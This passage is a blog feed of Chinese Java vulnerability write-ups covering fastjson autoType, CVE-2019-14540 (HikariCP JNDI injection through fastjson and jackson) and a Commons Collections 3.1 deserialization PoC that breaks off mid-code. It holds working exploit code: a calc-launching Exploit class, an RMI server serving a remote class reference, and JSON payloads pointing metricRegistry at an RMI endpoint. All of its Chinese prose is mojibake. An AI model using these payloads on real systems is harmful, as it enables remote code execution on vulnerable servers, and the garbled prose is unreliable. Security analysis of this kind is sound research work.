class="keyword">this</span>.prefix == <span class="keyword">null</span> ? <span class="string">""</span> : <span class="keyword">this</span>.prefix)</span><br></pre></td></tr></table></figure></p><p>é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œ<code>this.getContext()</code>æ˜¯æ€ä¹ˆè®¾ç½®çš„å‘¢ï¼Ÿ<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Context <span class="title">getContext</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.context;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>è·å–äº†æˆå‘˜å˜é‡<code>this.context</code>ï¼Œåœ¨æ„é€ æ–¹æ³•ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸€é¡¿å¥—å¨ƒçš„æ“ä½œï¼Œæ— å‚æ„é€ å‡½æ•°è°ƒç”¨å•å‚æ•°æ„é€ å‡½æ•°ï¼Œè°ƒç”¨åŒå‚æ•°æ„é€ å‡½æ•°ï¼Œå°†<code>new InitialContext()</code>èµ‹ç»™äº†æˆå‘˜å˜é‡<code>this.context</code><br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846065185814.jpg" alt="-w1071"><br>æœ€ç»ˆå¯¼è‡´æ¼æ´äº§ç”Ÿã€‚</p><p>ç´¢ç„¶æ— å‘³ï¼Œä»…ä»…å¯¹gadget chainè¿›è¡Œäº†ç®€å•åˆ†æï¼Œå¯¹fastjsonçš„å…³é”®ä»£ç åˆ†ææ¬ ç¼ºï¼Œæ¥ä¸‹é‡Œçš„ä»»åŠ¡å°±æ˜¯ææ‡‚fastjsonæ¼æ´è§¦å‘çš„æ¡ä»¶ä»¥åŠåŸç†ã€‚</p><h2 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h2><p>æ¼æ´å½±å“fastjsonç‰ˆæœ¬ï¼š<code>version &lt;= 1.2.61</code>ã€‚ä¿®å¤ä¹Ÿå°±æ˜¯å¤šäº†ä¸ªç»„ä»¶é»‘åå•ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Web" scheme="https://0day.design/categories/Web/"/>
    
    
      <category term="Java" scheme="https://0day.design/tags/Java/"/>
    
      <category term="æ¼æ´åˆ†æ" scheme="https://0day.design/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-14540 è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æ</title>
    <link href="https://0day.design/2020/01/28/CVE-2019-14540%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://0day.design/2020/01/28/CVE-2019-14540 è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æ/</id>
    <published>2020-01-28T07:49:00.000Z</published>
    <updated>2020-03-19T12:47:56.509Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h2 id="fastjsonå…¥é—¨"><a href="#fastjsonå…¥é—¨" class="headerlink" title="fastjsonå…¥é—¨"></a>fastjsonå…¥é—¨</h2><p>ä¸‹è½½<a href="https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.53/fastjson-1.2.53.jar" target="_blank" rel="noopener">fastjsonæœ€æ–°ç‰ˆjaråŒ…ä¸‹è½½</a>ï¼ŒIdea æ–°å»ºé¡¹ç›®-&gt;é€‰æ‹©<code>jdk1.7</code>â€”&gt;é€‰æ‹©File &gt; project structure &gt; Modules &gt; dependencies &gt; + JARS or directories -&gt;åŠ è½½ä¸‹è½½çš„ç»„ä»¶<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846064815544.jpg" alt="-w1464"></p><p>å†™ä¸€ä¸ªUserç±»ï¼Œæ¥ç€ä½¿ç”¨fastjsonè§£æä¸€æ®µjsonæ•°æ®ï¼š<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getAgeæ–¹æ³•è¢«è‡ªåŠ¨è°ƒç”¨ï¼"</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"setAgeæ–¹æ³•è¢«è‡ªåŠ¨è°ƒç”¨ï¼"</span>);</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getNameæ–¹æ³•è¢«è‡ªåŠ¨è°ƒç”¨ï¼"</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"setNameæ–¹æ³•è¢«è‡ªåŠ¨è°ƒç”¨ï¼"</span>);</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//ä½¿ç”¨@typeæŒ‡å®šè¯¥JSONå­—ç¬¦ä¸²åº”è¯¥è¿˜åŸæˆä½•ç§ç±»å‹çš„å¯¹è±¡</span></span><br><span class="line">        String userInfo = <span class="string">"&#123;\"@type\":\"test.User\",\"name\":\"passer6y\", \"age\":18&#125;"</span>;</span><br><span class="line">        <span class="comment">//å¼€å¯setAutoTypeSupportæ”¯æŒautoType</span></span><br><span class="line">        ParserConfig.global.setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">//ååºåˆ—åŒ–æˆUserå¯¹è±¡</span></span><br><span class="line">        JSONObject user = JSON.parseObject(userInfo);</span><br><span class="line">        <span class="comment">//User user = (User) JSON.parse(userInfo); åªä¼šè°ƒç”¨setXXæ–¹æ³•</span></span><br><span class="line">        <span class="comment">//System.out.println(user.getName());</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846064815556.jpg" alt="-w1230"></p><p>åœ¨ä½¿ç”¨<code>JSON.parseObject</code>è§£æjsonæ—¶ï¼Œä»£ç ä¸­çš„<code>setXX</code>ã€<code>getXX</code>æ–¹æ³•è‡ªåŠ¨è°ƒç”¨ï¼Œå¦‚æœå‡½æ•°ä¸­å­˜åœ¨ä¸€äº›æ•æ„Ÿæ“ä½œï¼Œåˆ™å¯èƒ½å¯¼è‡´æ¼æ´äº§ç”Ÿã€‚</p><blockquote><p><code>JSON.parse</code>åªä¼šè°ƒç”¨<code>setXX</code>æ–¹æ³•ï¼Œä¸ä¼šè‡ªåŠ¨è°ƒç”¨<code>getXX</code></p></blockquote><p>å¦å¤–ï¼Œå°†jsonä¸­çš„ageå…ƒç´ åˆ é™¤åï¼Œä½¿ç”¨<code>JSON.parseObject</code>ï¼Œä»ç„¶ä¼šè°ƒç”¨<code>getAge</code>æ–¹æ³•ã€‚<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846064815566.jpg" alt="-w1155"></p><blockquote><p>ä¹Ÿå°±æ˜¯è¯´<code>parseObject</code>è°ƒç”¨å…¨éƒ¨å±æ€§çš„<code>getXX</code>æ–¹æ³•ï¼Œå’Œè®¾ç½®å±æ€§çš„<code>setXX</code>æ–¹æ³•</p></blockquote><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>åˆ†æ10åˆ†é’Ÿï¼Œå¤ç°3å°æ—¶ï¼Œç¯å¢ƒæ— é™é‡‡å‘â€¦ï¼ˆmavençœŸé¦™</p><h3 id="RMIæœåŠ¡ç«¯æ­å»º"><a href="#RMIæœåŠ¡ç«¯æ­å»º" class="headerlink" title="RMIæœåŠ¡ç«¯æ­å»º"></a>RMIæœåŠ¡ç«¯æ­å»º</h3><p>è¿™é‡Œä½¿ç”¨äº†RMIåŠ¨æ€åŠ è½½è¿œç¨‹classæ–‡ä»¶ï¼Œå‚è€ƒç¬”è®°ï¼š<a href="mweblib://15800918927450" target="_blank" rel="noopener">æ·±å…¥ç†è§£RMI&amp;JNDI</a></p><p>ä½¿ç”¨javacå°†ä¸‹é¢ä»£ç ç¼–è¯‘æˆclassæ–‡ä»¶ï¼Œæ”¾åˆ°webæœåŠ¡å™¨ä¸­,è¿™é‡Œä½¿ç”¨nginx(<a href="https://127.0.0.1/Exploit.class" target="_blank" rel="noopener">https://127.0.0.1/Exploit.class</a>)<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (System.getProperty(<span class="string">"os.name"</span>).toLowerCase().startsWith(<span class="string">"win"</span>)) &#123;</span><br><span class="line">                Runtime.getRuntime().exec(<span class="string">"calc.exe"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getProperty(<span class="string">"os.name"</span>).toLowerCase().startsWith(<span class="string">"mac"</span>)) &#123;</span><br><span class="line">                Runtime.getRuntime().exec(<span class="string">"open /Applications/Calculator.app"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">"No calc for you!"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>å†èµ·ä¸€ä¸ªRMIæœåŠ¡ç«¯ï¼ŒåŠ¨æ€åŠ è½½è¿œç¨‹classæ–‡ä»¶:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line">    <span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">server</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//åˆ›å»ºRMI Registryï¼Œé»˜è®¤ç›‘å¬1099ç«¯å£</span></span><br><span class="line">            Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">            String remote_class = <span class="string">"https://127.0.0.1/"</span>;</span><br><span class="line">            <span class="comment">//Referenceå¯¹è±¡ä»£è¡¨å­˜åœ¨äºJNDIä»¥å¤–çš„å¯¹è±¡çš„å¼•ç”¨</span></span><br><span class="line">            Reference reference = <span class="keyword">new</span> Reference(<span class="string">"Exploit"</span>, <span class="string">"Exploit"</span>, remote_class);</span><br><span class="line">            ReferenceWrapper re = <span class="keyword">new</span> ReferenceWrapper(reference);</span><br><span class="line">            <span class="comment">//æŠŠReferenceå¯¹è±¡ç»‘å®šåˆ°Registryï¼Œå®¢æˆ·ç«¯å¯ä»¥é€šè¿‡åœ¨RegistryæŸ¥æ‰¾Exploitè·å–åˆ°reå¯¹è±¡</span></span><br><span class="line">            registry.bind(<span class="string">"Exploit"</span>,re);</span><br><span class="line">            System.out.println(<span class="string">"RMIæœåŠ¡å·²ç»å¯åŠ¨...."</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="æ¼æ´ç¯å¢ƒæ­å»º-amp-å¤ç°"><a href="#æ¼æ´ç¯å¢ƒæ­å»º-amp-å¤ç°" class="headerlink" title="æ¼æ´ç¯å¢ƒæ­å»º&amp;å¤ç°"></a>æ¼æ´ç¯å¢ƒæ­å»º&amp;å¤ç°</h3><ul><li>jdkç‰ˆæœ¬ï¼šjdk1.8.0_73</li><li>jacksonç‰ˆæœ¬ï¼š2.10.0</li><li>HikariCPç‰ˆæœ¬ï¼š3.3.1</li><li>fastjsonç‰ˆæœ¬ï¼š1.2.53<br>ideaåˆ›å»ºmavené¡¹ç›®ï¼Œåœ¨pom.xmlæ·»åŠ ä¾èµ–ï¼š<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.fasterxml.jackson.core/jackson-databind --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.10.0.pr1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.zaxxer/HikariCP --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.zaxxer<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>HikariCP<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.alibaba/fastjson --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.53<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><p>jackson poc:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String json = <span class="string">"[\"com.zaxxer.hikari.HikariConfig\",&#123;\"metricRegistry\":\"rmi://127.0.0.1:1099/Exploit\"&#125;]"</span>;</span><br><span class="line">        ObjectMapper objectMapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        objectMapper.enableDefaultTyping();</span><br><span class="line">        objectMapper.readValue(json,Object.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846064815579.jpg" alt="-w1486"></p><p>fastjson poc:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">fastjsonEXP</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        ParserConfig.global.setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line">        JSON.parseObject(<span class="string">"&#123;\"@type\":\"com.zaxxer.hikari.HikariConfig\",\"metricRegistry\":\"rmi://127.0.0.1:1099/Exploit\"&#125;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846064815589.jpg" alt="-w1352"></p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>ä»ä¸Šæ–‡ä¸­fastjsonå…¥é—¨éƒ¨åˆ†æˆ‘ä»¬çŸ¥é“ï¼Œåœ¨è§£æjsonæ•°æ®çš„æ—¶å€™ä¼šè‡ªåŠ¨è°ƒç”¨<code>setXX</code>æ–¹æ³•ï¼Œåœ¨<code>HikariCP</code>è¿™ä¸ªç»„ä»¶ä¸­ï¼ŒHikariConfig.classä¸­å¯ä»¥çœ‹åˆ°<code>setMetricRegistry</code>æ–¹æ³•è°ƒç”¨äº†<code>getObjectOrPerformJndiLookup</code>æ–¹æ³•ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846064815600.jpg" alt="-w1487"><br>è·Ÿè¿›å…¶ä¸­ï¼Œè°ƒç”¨äº†<code>InitialContext.lookup(object)</code><br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846064815610.jpg" alt="-w1130"><br>å¾ˆæ˜æ˜¾çš„<code>jndi Reference</code>æ³¨å…¥ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬åœ¨æ„é€ pocçš„æ—¶å€™ï¼Œåˆ©ç”¨fastjsonçš„<code>@type</code>åŠ è½½è¯¥å¯¹è±¡<code>com.zaxxer.hikari.HikariConfig</code>ï¼Œä½¿ç”¨<code>metricRegistry</code>å±æ€§ï¼Œå»è§¦å‘<code>setMetricRegistry</code>æ–¹æ³•ï¼Œæœ€ç»ˆä½¿ä¹‹åŠ è½½æˆ‘ä»¬æ¶æ„çš„RMIæœåŠ¡ç¨‹åºã€‚<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;\"@type\":\"com.zaxxer.hikari.HikariConfig\",\"metricRegistry\":\"rmi://127.0.0.1:1099/Exploit\"&#125;</span><br></pre></td></tr></table></figure></p><p>åŒæ ·çš„ï¼Œåœ¨jacksonä¸­ä¹Ÿæœ‰è¿™æ ·çš„é—®é¢˜ï¼š<br><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[\<span class="string">"com.zaxxer.hikari.HikariConfig\",&#123;\"metricRegistry\":\"rmi://127.0.0.1:1099/Exploit\"&#125;]</span></span><br></pre></td></tr></table></figure></p><h2 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h2><p>é€šè¿‡ä¸Šé¢çš„åˆ†æï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥å‘ç°å…¶å®è¿™æ˜¯å¤šç»„ä»¶ç»„åˆå¯¼è‡´çš„è¿œç¨‹ä»£ç æ‰§è¡Œï¼Œéœ€è¦ç¯å¢ƒä¸­ä½¿ç”¨äº†fastjsonæˆ–è€…jacksonåº“ï¼ŒåŒæ—¶è¿˜ä½¿ç”¨äº†ç¬¬ä¸‰æ–¹ç»„ä»¶<code>HikariCP</code>å¯¼è‡´çš„ï¼Œè€Œå®˜æ–¹çš„ä¿®å¤ä¹Ÿåªæ˜¯å°†è¯¥æ‰©å±•æ·»åŠ è¿›äº†é»‘åå•(<a href="https://github.com/LeadroyaL/fastjson-blacklist" target="_blank" rel="noopener">fastjson-blacklist</a>ã€<a href="https://github.com/FasterXML/jackson-databind/commit/d4983c740fec7d5576b207a8c30a63d3ea7443de" target="_blank" rel="noopener">jacksonä¿®å¤commit</a>)ã€‚</p><p>å‚è€ƒæ–‡ç« ï¼š</p><ul><li><a href="https://curz0n.github.io/2019/09/20/cve-2019-14540/#3-%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE" target="_blank" rel="noopener">curz0n:CVE-2019-14540è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æ&amp;å¤ç°</a></li><li><a href="https://b1ue.cn/archives/189.html" target="_blank" rel="noopener">b1ue:Java ååºåˆ—åŒ–æ¼æ´å§‹æœ«ï¼ˆ4ï¼‰â€” jackson</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Web" scheme="https://0day.design/categories/Web/"/>
    
    
      <category term="Java" scheme="https://0day.design/tags/Java/"/>
    
      <category term="æ¼æ´åˆ†æ" scheme="https://0day.design/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>Javaå…¥å‘ï¼šApache-Commons-Collections-3.1 ååºåˆ—åŒ–æ¼æ´åˆ†æ</title>
    <link href="https://0day.design/2020/01/24/Apache-Commons-Collections-3.1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://0day.design/2020/01/24/Apache-Commons-Collections-3.1 ååºåˆ—åŒ–æ¼æ´åˆ†æ/</id>
    <published>2020-01-24T08:20:00.000Z</published>
    <updated>2020-03-19T12:47:56.509Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>ç»„ä»¶ä¸‹è½½ï¼š<br><a href="https://mvnrepository.com/artifact/commons-collections/commons-collections/3.1" target="_blank" rel="noopener">https://mvnrepository.com/artifact/commons-collections/commons-collections/3.1</a></p><p>Idea æ–°å»ºé¡¹ç›®-&gt;é€‰æ‹©jdk1.7â€”&gt;é€‰æ‹©File &gt; project structure &gt; Modules &gt; dependencies &gt; + JARS or directories -&gt;åŠ è½½ä¸‹è½½çš„ç»„ä»¶</p><p><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846065496782.jpg" alt=""></p><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>poc:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvalObject</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span 